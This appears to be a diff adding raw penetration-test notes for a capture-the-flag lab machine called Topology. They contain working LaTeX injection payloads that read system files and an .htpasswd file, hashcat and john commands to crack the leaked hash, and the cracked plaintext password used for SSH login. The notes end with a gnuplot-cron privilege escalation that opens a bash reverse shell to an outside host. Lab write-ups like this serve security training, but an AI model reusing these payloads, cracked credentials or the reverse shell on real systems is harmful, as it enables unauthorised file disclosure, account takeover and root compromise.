@@ -1,0 +1,378 @@
+10.10.11.217
+
+php 
+Apache/2.4.41 (Ubuntu)
+
+
+-------------------------------------------------------------------------------------------------------
+nmap -sCV -Pn -p- 10.10.11.217 2>/dev/null
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 08:55 EDT
+Nmap scan report for 10.10.11.217
+Host is up (0.13s latency).
+Not shown: 65511 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+4996/tcp  filtered unknown
+5183/tcp  filtered unknown
+5559/tcp  filtered unknown
+11556/tcp filtered unknown
+13099/tcp filtered unknown
+15244/tcp filtered unknown
+23769/tcp filtered unknown
+24085/tcp filtered unknown
+27464/tcp filtered unknown
+30620/tcp filtered unknown
+37184/tcp filtered unknown
+46763/tcp filtered unknown
+46766/tcp filtered unknown
+47959/tcp filtered unknown
+49476/tcp filtered unknown
+50365/tcp filtered unknown
+51422/tcp filtered unknown
+53706/tcp filtered unknown
+54502/tcp filtered unknown
+62661/tcp filtered unknown
+64572/tcp filtered unknown
+64685/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 713.75 seconds
+
+
+
+ssti ?
+
+dirsearch -u tolpology.htb:80 -e "*" -r 
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.tolpology.htb" --hc 403,400,301 --hl 174 -t 50 10.10.11.217
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.tolpology.htb" --hl 174 -t 50 10.10.11.217
+
+https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
+
+formular injection	#latex-injection
+
+\input{/etc/passwd} => block
+\include{password} # load .tex file => block
+\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf} => blank
+\usepackage{verbatim} => block
+\verbatiminput{/etc/passwd} => blank
+
+
+
+
+Read single lined file:
+
+\newread\file => return img
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file
+
+{\newread\file
+\openin\file=/etc/hosts
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+{\newread\file}{\openin\file=/etc/issue}{\read\file to\line}{\text{\line}}{\closein\file}
+
+{\newread\file}${\openin\file=/etc/issue}${\read\file to\line}${\text{\line}}${\closein\file}
+
+[\newread\file]$[\openin\file=/etc/issue]$[\read\file to\line]$[\text{\line}]$[\closein\file]
+
+{\newread\file%0a\openin\file=/etc/issue%0a\read\file%20to\line%0a\text{\line}%0a\closein\file}
+
+
+{\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\text{\line}
+\closein\file}
+
+{\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+{\newread\file
+\openin\file=/var/www/html/index.html
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+
+{\newwrite\outfile
+\openout\outfile=nsrevs.php
+\closeout\outfile}
+
+
+{\newread\file
+\openin\file=/var/www/html/nsrevs.php
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+{\verbatiminput{/etc/passwd > /var/www/html/nsrevs.txt}}
+
+
+{\newread\file
+\openin\file=/var/www/html/nsrevs.txt
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+
+
+{\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\verbatiminput{/etc/passwd}}
+
+
+{\newwrite\outfile
+\openout\outfile=/var/www/html/cmd.tex
+\closeout\outfile}
+
+
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+    \read\file to\fileline
+	\text{\fileline}
+\repeat
+\closein\file
+
+
+{\newcounter{ct}
+\newread\file
+\openin\file=/etc/passwd
+\forloop{ct}{1}{\value{ct} < 2}%
+{%
+	\thect\
+	\read\file to\fileline
+	\text{\fileline}
+}
+\closein\file}
+
+
+{\newcounter{ct}
+\newread\file
+\openin\file=/etc/passwd
+\setcounter{ct}{1}
+\whiledo {\value{ct} < 5}%
+{%
+	\thect\
+	\read\file to\fileline
+	\text{\fileline}
+	\stepcounter {ct}%
+}
+\closein\file}
+
+
+{\newcounter{ct}
+\setcounter{ct}{1}
+\whiledo {\value{ct} < 5}%
+{%
+  \thect\
+  \stepcounter {ct}%
+}}
+
+
+{\newread\file
+\openin\file=/etc/passwd
+\foreach \n in {0,...,3}%
+{%
+	\read\file to\fileline
+	\text{\fileline}}
+\closein\file}
+
+
+
+\loop\unless\ifeof\file
+    \read\file to\fileline
+	\text{\fileline}
+\repeat
+\closein\file
+
+{\documentclass{minimal}
+\usepackage{pgffor}
+\newread\file
+\openin\file=/etc/passwd
+\foreach \n in {1,...,4}{\read\file to\fileline}
+\text{\fileline}
+\closein\file}
+
+
+\Repeat{6}{\cmd}
+\foreach \n in {0,...,3}{do something}
+
+
+\catcode`\%=12
+
+{\newread\file
+\openin\file=/etc/apache2/sites-available/000-default.conf
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+\catcode`A=read
+
+{\newread\file
+\openin\file=/etc/hosts
+\read\file to\line
+\text{\line}
+\closein\file}
+
+{\newread\file
+\catcode`\%=12
+\openin\file=/usr/share/texlive/texmf-dist/tex/latex/psnfss/omlztmcm.fd
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+{\newread\file
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\openin\file=../equation.php
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+ref: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md
+
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+
+{\newwrite\outfile
+\catcode`w = \active
+\openout\outfile=nsrevs.txt
+\active\outfile{Hello-world}
+\closeout\outfile}
+
+{\newread\file
+\catcode`r=\active
+\openin\file=/etc/hosts
+\active\ead\file to\line
+\text{\line}
+\closein\file}
+
+
+{\newread\file
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\openin\file=/etc/hosts
+\read\file to\line
+\read\file to\line
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+gobuster vhost -u http://topology.htb --append-domain -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100    
+
+
+
+{\newread\file
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\openin\file=/etc/apache2/sites-available/000-default.conf
+\read\file to\line
+\text{\line}
+\closein\file}
+
+
+$\newread\file
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\openin\file=/var/www/dev/.htpasswd
+\read\file to\line
+\text{\line}
+\closein\file$
+
+
+
+$\begin{filecontents}{asdasd.txt}
+aaaaaaaa
+\end{filecontents}$
+
+\begin{filecontents}{myfile.txt}
+
+
+
+$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$
+
+$\lstinputlisting{/var/www/dev/.htpasswd}$
+
+vdaisley$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+
+$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 => hashfile
+
+hashcat -a 3 -m 1600 -w 4 hashfile /usr/share/eaphammer/wordlists/rockyou.txt
+
+john --format=md5 --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt hashfile
+
+vdaisley|calculus20
+
+ssh vdaisley@10.10.11.217
+calculus20
+
+
+find / -user 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
+
+find / -group 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
+
+find / -type d -perm -o+w -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
+
+
+2023/07/09 03:56:01 CMD: UID=0    PID=235516 | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
+2023/07/09 03:56:01 CMD: UID=0    PID=235515 | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;                                                                                 
+2023/07/09 03:56:01 CMD: UID=0    PID=235518 | /usr/sbin/CRON -f 
+2023/07/09 03:56:01 CMD: UID=0    PID=235517 | gnuplot /opt/gnuplot/loadplot.plt 
+
+ref: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/
+
+
+system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/7050 0>&1'"
+
+
